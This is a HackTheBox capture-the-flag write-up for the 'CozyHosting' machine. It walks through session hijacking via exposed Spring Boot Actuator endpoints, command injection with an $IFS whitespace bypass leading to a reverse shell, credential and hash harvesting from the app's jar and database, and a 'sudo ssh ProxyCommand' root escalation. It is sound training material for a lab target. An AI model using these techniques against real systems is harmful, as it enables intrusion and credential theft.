---
title: "CozyHosting"
date: 2025-01-25T21:58:19-06:00
draft: false
tags:
- HTB
- Linux
- Web Security
- Command Injection
- Broken Access Control
- Security Misconfiguration
- Spring Boot
- Session Hijacking
---

![CozyHosting](/img/cozyhosting/cozyhosting.png)

### Description
CozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding an exposed user session and exploitating an authenticated 
command injection vulnerability. After gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.


### Recon
Starting off with a nmap scan, we find 2 open TCP ports: 22 and 80.

```
# Nmap 7.94SVN scan initiated Sun Jan 26 14:49:51 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.230
Increasing send delay for 10.10.11.230 from 0 to 5 due to 599 out of 1496 dropped probes since last increase.
Increasing send delay for 10.10.11.230 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
Warning: 10.10.11.230 giving up on port because retransmission cap hit (6).
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.041s latency).
Not shown: 65424 closed tcp ports (reset), 109 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/26%OT=22%CT=1%CU=42919%PV=Y%DS=2%DC=T%G=Y%TM=6796
OS:A375%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5
OS:3CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O
OS:6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 42.330 days (since Sun Dec 15 07:09:02 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   40.73 ms 10.10.14.1
2   40.83 ms cozyhosting.htb (10.10.11.230)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 26 15:04:53 2025 -- 1 IP address (1 host up) scanned in 903.07 seconds
```

Port 80 reveals a website:

![Cozyhosting webpage](/img/cozyhosting/webpage.png)

Directory busting reveals the ```/actuator/``` subdirectory. Actuator is a module for monitoring Spring Boot websites. Interestingly, we get ```200 OK``` responses for Actuator, including ```/actuator/sessions```.

```
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://cozyhosting.htb --exclude-sizes=0B
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://cozyhosting.htb/

[16:52:15] Starting: 
[16:52:43] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:52:46] 400 -  435B  - /a%5c.aspx                                        
[16:52:50] 200 -  634B  - /actuator                                         
[16:52:51] 200 -  124KB - /actuator/beans                                   
[16:52:51] 200 -    5KB - /actuator/env                                     
[16:52:51] 200 -   15B  - /actuator/health                                  
[16:52:51] 200 -   10KB - /actuator/mappings                                
[16:52:51] 200 -  398B  - /actuator/sessions
[16:52:54] 401 -   97B  - /admin                                            
[16:53:54] 500 -   73B  - /error                                            
[16:54:26] 200 -    4KB - /login                                            
                                                                             
Task Completed
```

Visiting ```/actuator/sessions``` reveals a user session for ```kanderson```.

![exposed Actuator sessions](/img/cozyhosting/sessions.png)


### Foothold

We can take over ```kanderson```'s session by adding his JSESSIONID cookie to our browser and refreshing the page.

![Replacing cookie](/img/cozyhosting/hijacking.png)

If not automatically redirected to ```http://cozyhosting.htb/admin```, heading there should now reveal the Admin dashboard.

![Web Admin Dashboard](/img/cozyhosting/hijacked.png)

At the bottom of the page, there is a feature called "Cozy Scanner" for automatic patch updates.

![Cozy Scanner](/img/cozyhosting/web_connection.png)

Tasks submitted to Cozy Scanner get passed to the ```/executessh``` endpoint. Some basic testing reveals that a single colon in the ```username``` parameter causes a syntax error. It's also revealed that the server is passing user input directly into a shell command as evidenced by ```/bin/bash -c```.

![Command syntax error](/img/cozyhosting/executessh.png)

To confirm if we have full command execution, I sent a payload to ping my kali machine. However, the server rejects it because it contains whitespaces.

![Ping command injection test](/img/cozyhosting/injection_whitespace.png)

Fortunately, we can use the $IFS variable as an alternative as it represents a whitespace by default.

![IFS command injection](/img/cozyhosting/IFS.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:15:35.692325 IP cozyhosting.htb > 10.10.14.60: ICMP echo request, id 4, seq 1, length 64
17:15:36.741961 IP cozyhosting.htb > 10.10.14.60: ICMP echo request, id 4, seq 2, length 64
```

With command injection confirmed, we can now send a payload and get a reverse shell.

![Reverse shell](/img/cozyhosting/rce.png)

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.230] 35240
whoami
app
```


### Privilege Escalation
After stabilizing the shell, I started enumeration. There is a ```cloudhosting-0.0.1.jar``` file in the directory we land in. We can transfer this file
 to our local machine for further analysis.

```
app@cozyhosting:/app$ ls -al
total 58856
drwxr-xr-x  2 root root     4096 Aug 14  2023 .
drwxr-xr-x 19 root root     4096 Aug 14  2023 ..
-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
┌──(kali㉿kali)-[/tmp]
└─$ wget http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
--2025-01-27 11:11:47--  http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
Resolving cozyhosting.htb (cozyhosting.htb)... 10.10.11.230
Connecting to cozyhosting.htb (cozyhosting.htb)|10.10.11.230|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’

cloudhosting-0.0.1.jar             100%[================================================================>]  57.47M   910KB/s    in 60s     

2025-01-27 11:12:47 (986 KB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
```
And to extract...

```
┌──(kali㉿kali)-[/tmp/jar]
└─$ jar xf cloudhosting-0.0.1.jar 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

Now we can enumerate the files for credentials. ```spring.datasource.password``` in ```BOOT-INF/classes/application.properties```
seems worth digging into.

```
┌──(kali㉿kali)-[/tmp/cozy]
└─$ grep -ri passw
grep: cloudhosting-0.0.1.jar: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: "\eecf"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: "\eed0"; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-fill"
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    <glyph glyph-name="lock-password-line"
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-fill">
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:</symbol><symbol viewBox="0 0 24 24" id="ri-lock-password-line">
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
BOOT-INF/classes/templates/login.html:                                        <label for="yourPassword" class="form-label">Password</label>
BOOT-INF/classes/templates/login.html:                                        <input type="password" name="password" class="form-control" id="yourPassword"
BOOT-INF/classes/templates/login.html:                                        <div class="invalid-feedback">Please enter your password!</div>
BOOT-INF/classes/templates/login.html:                                    <p th:if="${param.error}" class="text-center small">Invalid username or password</p>
BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
grep: BOOT-INF/lib/spring-security-config-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-web-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar: binary file matches
grep: BOOT-INF/lib/tomcat-embed-core-10.1.5.jar: binary file matches
grep: BOOT-INF/lib/spring-webmvc-6.0.4.jar: binary file matches
grep: BOOT-INF/lib/postgresql-42.5.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-core-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
```

We find PostgreSQL credentials.

```
┌──(kali㉿kali)-[/tmp/cozy]
└─$ cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Querying systemctl reveals that PostgreSQL is indeed running on the CozyHosting server. We can therefore authenticate with the credentials we found.

```
app@cozyhosting:/tmp$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor pr>
     Active: active (exited) since Sat 2025-01-25 22:33:04 UTC; 2h 5min ago
    Process: 1129 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 1129 (code=exited, status=0/SUCCESS)
        CPU: 804us
```

Authentication:

```
app@cozyhosting:/tmp$ psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=#
```

Further enumeration reveals a users table from the cozyhosting database, which includes password hashes for the ```kanderson``` and ```admin``` users.

```
postgres-# \l
postgres-# \c cozyhosting
cozyhosting=# \dt
cozyhosting=# select * from users;
cozyhosting=# 
```

```
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
```

I was only able to crack the password hash for ```admin```. We can test for password reuse.

```
┌──(kali㉿kali)-[/tmp]
└─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

Looking at the users, ```root```, ```josh```, and ```postgres``` seem worth looking into.
```
app@cozyhosting:/app$ cat /etc/passwd | grep -v nologin | grep -v false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```

Using ```manchesterunited``` as ```josh```'s password is successful.
```
app@cozyhosting:/tmp$ su josh
Password: 
josh@cozyhosting:/tmp$
```

Checking sudo privileges for ```josh``` shows that he can run ssh as root.

```
josh@cozyhosting:/tmp$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

We can exploit this by using ssh's ProxyCommand feature to execute commands. We will need to direct both stdin and stdout to stderr
 in order to see our commands and responses within our current session. Payload courtesy of gtfobins.

```
josh@cozyhosting:/tmp$ sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
root@cozyhosting:/tmp# whoami
root
```

And with that, CozyHosting is owned.